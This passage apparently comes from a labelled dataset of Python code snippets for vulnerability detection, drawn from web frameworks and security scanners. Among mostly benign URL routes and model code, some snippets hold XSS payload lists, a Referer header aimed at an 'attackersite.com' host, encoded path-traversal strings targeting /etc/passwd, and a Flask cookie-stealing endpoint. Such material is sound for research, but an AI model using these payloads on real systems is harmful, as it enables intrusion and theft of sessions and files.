"'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"", "label": 0}, {"snippet_id": 18021, "code": " settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create", "label": 0}, {"snippet_id": 21494, "code": "/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url", "label": 0}, {"snippet_id": 36718, "code": "\t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content", "label": 0}, {"snippet_id": 8037, "code": "]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses", "label": 0}, {"snippet_id": 21294, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index", "label": 1}, {"snippet_id": 10619, "code": ": text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for", "label": 0}, {"snippet_id": 23699, "code": "\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE", "label": 0}, {"snippet_id": 25909, "code": " required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None, widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds", "label": 0}, {"snippet_id": 54008, "code": " import datetime try: from tkinter import * from tkinter import ttk except: print(\"You need to install: tkinter\") sys.exit() try: import bane except: print(\"You need to install: bane\") sys.exit() class", "label": 0}, {"snippet_id": 14118, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes", "label": 0}, {"snippet_id": 41754, "code": "(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: ", "label": 0}, {"snippet_id": 23418, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views", "label": 0}, {"snippet_id": 6122, "code": ":param filename: string, INI-file name :param debug: boolean, default debug value :raise ValueError: if INI-file can't be parsed \"\"\" def __init__(self, filename, debug): self._parsed_content_packages=None", "label": 0}, {"snippet_id": 44568, "code": "], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows", "label": 0}, {"snippet_id": 22050, "code": "'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/',", "label": 0}, {"snippet_id": 27675, "code": " values['is_development']=( environment.is_running_on_app_engine_development()) values['is_logged_in']=bool(helpers.get_user_email()) values['ga_tracking_id']=( local_config.GAEConfig().get('ga_tracking_id'", "label": 0}, {"snippet_id": 6923, "code": ".contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 54494, "code": " from django.urls import reverse from django.template import RequestContext from django.shortcuts import Http404, redirect, render, render_to_response from django.views.generic import ListView, DetailView", "label": 0}, {"snippet_id": 12339, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware", "label": 0}, {"snippet_id": 20842, "code": "\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i", "label": 0}, {"snippet_id": 7239, "code": "'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r", "label": 0}, {"snippet_id": 46405, "code": "=collection['id']) else: dashboard_doc=Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects", "label": 0}, {"snippet_id": 20091, "code": "-xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), ", "label": 0}, {"snippet_id": 24952, "code": ".imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir,", "label": 0}, {"snippet_id": 26135, "code": "-dependency'] self.fields['name_parts']=NamePartsFormField( max_length=255, required=event.settings.invoice_name_required and not self.all_optional, scheme=event.settings.name_scheme, label=_('Name'), initial=", "label": 0}, {"snippet_id": 37395, "code": ".name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_(", "label": 0}, {"snippet_id": 52136, "code": ", request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json", "label": 1}, {"snippet_id": 7016, "code": " 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login", "label": 0}, {"snippet_id": 52512, "code": ".get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')", "label": 0}, {"snippet_id": 2039, "code": " host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value", "label": 0}, {"snippet_id": 50201, "code": " del self.requests[csessid] else: dataentries=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect", "label": 0}, {"snippet_id": 43617, "code": "=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t", "label": 0}, {"snippet_id": 28322, "code": " get_app_dir(): \td=sys.path[0] \td=d.split('/')[-1]\t\t \treturn sys.path[0] if d==\"app\" else os.path.dirname(sys.path[0])\t def get_config_var(sec, var): \tfrom configparser import ConfigParser, ExtendedInterpolation", "label": 0}, {"snippet_id": 11760, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id'", "label": 0}, {"snippet_id": 26589, "code": "%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f", "label": 0}, {"snippet_id": 43422, "code": "\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit", "label": 1}, {"snippet_id": 22741, "code": "'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r", "label": 0}, {"snippet_id": 49125, "code": " self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order) }) else: return self.get_url_with_query_params({ self.ordering_query_param: self.column_id }) elif self.current_columns_length >", "label": 0}, {"snippet_id": 14746, "code": ") self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual", "label": 0}, {"snippet_id": 43719, "code": " fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): ", "label": 0}, {"snippet_id": 38088, "code": "\t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed", "label": 1}, {"snippet_id": 39949, "code": ".fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) ", "label": 0}, {"snippet_id": 53918, "code": "): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies", "label": 0}, {"snippet_id": 36508, "code": "\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance", "label": 0}, {"snippet_id": 52415, "code": "({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc", "label": 0}, {"snippet_id": 40096, "code": " \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length", "label": 0}, {"snippet_id": 48403, "code": " return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art.id)]) if amount > 0: ar=ArticleRequested() ar.AID=art ar.RID=current_reservation", "label": 0}, {"snippet_id": 358, "code": " if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs", "label": 1}, {"snippet_id": 5683, "code": " x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y", "label": 0}, {"snippet_id": 28752, "code": " here?! O_o You do not have need permissions</h>') \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">') \t\timport sys \t\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko", "label": 0}, {"snippet_id": 48652, "code": ": return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\") if request.POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if request.POST.get(\"contact\"): r.responsiblePerson=str(request.POST[", "label": 1}, {"snippet_id": 36372, "code": " high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not", "label": 0}, {"snippet_id": 4195, "code": "(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id", "label": 0}, {"snippet_id": 30645, "code": "+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(log_path +viewlog, date, date1", "label": 0}, {"snippet_id": 6117, "code": " configuration from an INI-file at instantiation. :param filename: string, INI-file name :param debug: boolean, default debug value :raise ValueError: if INI-file can't be parsed \"\"\" def __init__(self, filename", "label": 0}, {"snippet_id": 37943, "code": ": \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t", "label": 0}, {"snippet_id": 10842, "code": " self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache", "label": 0}, {"snippet_id": 10389, "code": "\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR", "label": 0}, {"snippet_id": 21870, "code": ".get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r", "label": 0}, {"snippet_id": 32226, "code": ") sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int", "label": 0}, {"snippet_id": 31143, "code": "+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp]) \t\t\t \tos.system(\"rm -f %s\" %", "label": 0}, {"snippet_id": 42274, "code": " get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype]", "label": 0}, {"snippet_id": 47359, "code": " get_current_user import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id=None profile: Profile=None if http_request.GET.get(\"user_id\"): user_id=int(http_request.GET[\"user_id\"", "label": 0}, {"snippet_id": 6794, "code": "): \"\"\" Authn info(failed logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained. \"\"\" return self.config.get(self.section", "label": 0}, {"snippet_id": 34257, "code": ".update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype)", "label": 0}, {"snippet_id": 48278, "code": "\"): forward_url=request.GET[\"redirect\"] else: forward_url=\"/admin\" if \"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user", "label": 0}, {"snippet_id": 8538, "code": "), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template", "label": 0}, {"snippet_id": 17429, "code": " 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/", "label": 0}, {"snippet_id": 23142, "code": "+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 19142, "code": "\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE", "label": 0}, {"snippet_id": 15572, "code": "\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses", "label": 0}, {"snippet_id": 11960, "code": "(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern", "label": 0}, {"snippet_id": 40544, "code": " currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe", "label": 0}, {"snippet_id": 28330, "code": "\treturn sys.path[0] if d==\"app\" else os.path.dirname(sys.path[0])\t def get_config_var(sec, var): \tfrom configparser import ConfigParser, ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir()+\"/haproxy", "label": 0}, {"snippet_id": 2886, "code": " try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme", "label": 0}, {"snippet_id": 41808, "code": ") \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance", "label": 0}, {"snippet_id": 1007, "code": " vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss", "label": 0}, {"snippet_id": 45497, "code": ".fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get(", "label": 0}, {"snippet_id": 35477, "code": "\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new(", "label": 0}, {"snippet_id": 5707, "code": "<y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http", "label": 0}, {"snippet_id": 406, "code": "\"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '", "label": 0}, {"snippet_id": 34241, "code": "\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) ", "label": 0}, {"snippet_id": 46918, "code": " create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio.gather( obj.set_content(content), redis.enqueue_job('mention_users', self.id, content, user_id), return_exceptions=True ) return obj async def", "label": 0}, {"snippet_id": 44422, "code": "(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST'", "label": 0}, {"snippet_id": 19877, "code": ".BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self", "label": 0}, {"snippet_id": 11371, "code": ").__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course", "label": 0}, {"snippet_id": 18669, "code": ".combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 584, "code": "=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if", "label": 0}, {"snippet_id": 5732, "code": ")</script></html>', '<scriscriptpt>alert(/xss/)</scriscriptpt>', '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>'", "label": 0}, {"snippet_id": 28070, "code": "=True, overwrite=True) self.render_json({'status': 'success'}) class LogoutHandler(base_handler.Handler): \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler", "label": 0}, {"snippet_id": 25199, "code": ".rich_text import rich_text from pretix.control.forms import SplitDateTimeField from pretix.helpers.i18n import get_format_without_seconds from pretix.presale.signals import question_form_fields logger", "label": 0}, {"snippet_id": 54801, "code": ".form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url='/' fields=['content', 'category'] template_name='update.html' def get_context_data", "label": 0}, {"snippet_id": 39776, "code": "'fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name',", "label": 0}, {"snippet_id": 33293, "code": ".BuildBucketApi, config_api.ConfigApi, swarmbucket_api.SwarmbucketApi, ] routes=[ webapp2.Route(r'/', MainHandler), webapp2.Route(r'/b/<build_id:\\d+>', BuildRPCHandler), webapp2.Route(r'/build/<build_id", "label": 0}, {"snippet_id": 38764, "code": "\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value", "label": 0}, {"snippet_id": 4397, "code": "/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def", "label": 0}, {"snippet_id": 47287, "code": " as db_mock: db_mock.side_effect=SQLAlchemyError() res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.post( delete_view_url, data={'id", "label": 0}, {"snippet_id": 47719, "code": ", pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect('/admin", "label": 0}, {"snippet_id": 7975, "code": "=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 32272, "code": "') parser.add_argument('file', nargs='?', help='open file in browser') args=parser.parse_args(argv) top_level=os.path.realpath(args.directory) hostname='0.0.0.0' if args.external else 'localhost' server_address", "label": 0}, {"snippet_id": 13158, "code": " name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student", "label": 0}, {"snippet_id": 40510, "code": "=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t", "label": 0}, {"snippet_id": 30018, "code": " alert-danger\">Please enter desired name</div>') \telse: \t\tname=form.getvalue('ssl_name') +'.pem' \t \ttry: \t\twith open(name, \"w\") as ssl_cert: \t\t\tssl_cert.write(form.getvalue('ssl_cert')) \texcept IOError:", "label": 0}, {"snippet_id": 15393, "code": ") self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files", "label": 0}, {"snippet_id": 42044, "code": " \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus", "label": 0}, {"snippet_id": 35610, "code": "(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1", "label": 0}, {"snippet_id": 21709, "code": "[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(", "label": 0}, {"snippet_id": 34177, "code": "\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core", "label": 0}, {"snippet_id": 54106, "code": "]URL:{}\".format(x)) bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck) print(\"[*]Test was finished at:{}\\n[*]Duration:{} seconds\\n\".format(datetime", "label": 0}, {"snippet_id": 21805, "code": "<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')", "label": 0}, {"snippet_id": 40234, "code": " to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value", "label": 0}, {"snippet_id": 52829, "code": "': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user,", "label": 0}, {"snippet_id": 11740, "code": "\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i", "label": 0}, {"snippet_id": 40032, "code": "'Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\"", "label": 0}, {"snippet_id": 18941, "code": "): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 26808, "code": "%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 51996, "code": " from desktop.lib.exceptions_renderable import 